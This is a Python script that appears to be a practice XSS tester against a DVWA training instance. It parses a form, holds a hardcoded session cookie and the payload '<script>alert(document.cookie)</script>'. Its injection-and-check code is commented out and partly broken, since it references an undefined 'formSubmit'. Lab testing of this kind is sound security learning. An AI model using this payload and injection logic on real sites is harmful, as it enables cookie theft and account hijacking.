import requests
from bs4 import BeautifulSoup
import mechanize
 
session = requests.Session()
session.headers["Cookie"] = "PHPSESSID=2r5bfcokovgu1hjf1v08amcd1g; security=low"
request = session.get("http://dvwa-win10/vulnerabilities/xss_d/")
# print(request.content)
parseHTML = BeautifulSoup(request.text, 'html.parser')
 
htmlForm = parseHTML.form
 
formName = htmlForm['method']
 
print ("Form name: " + formName)
 
 
inputs = htmlForm.find_all('input')
 
inputFieldNames = []
 
for items in inputs:
    if items.has_attr('name'):
        inputFieldNames.append(items['name'])
 
print (inputFieldNames)
 
 
br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders = [('Cookie','PHPSESSID=2r5bfcokovgu1hjf1v08amcd1g')]

br.open("http://dvwa-win10/vulnerabilities/xss_d/")
# br.select_form(nr = 0)
# br.form = list(br.forms())[0]
br.select_form("XSS")
# for form in br.forms():
#     print(form)
 
print(br.form.attrs)
payLoad = '<script>alert(document.cookie)</script>'
 
# # First field is always the payload, you can select anyfield for payload
# # But that don't edit it later.
 
# br.form[inputFieldNames[0]] = payLoad
 
# for i in range(1,len(inputFieldNames)):
#     formSubmit.form[inputFieldNames[i]] = payLoad
 
 
# res = formSubmit.submit()
# # print(res.read())

# finalResult = res.read().decode()

# print(finalResult)
# # print(finalResult)
# if payLoad in finalResult: 
#     print ("Application is vulnerable")
# else:
#     print ("You are in good hands")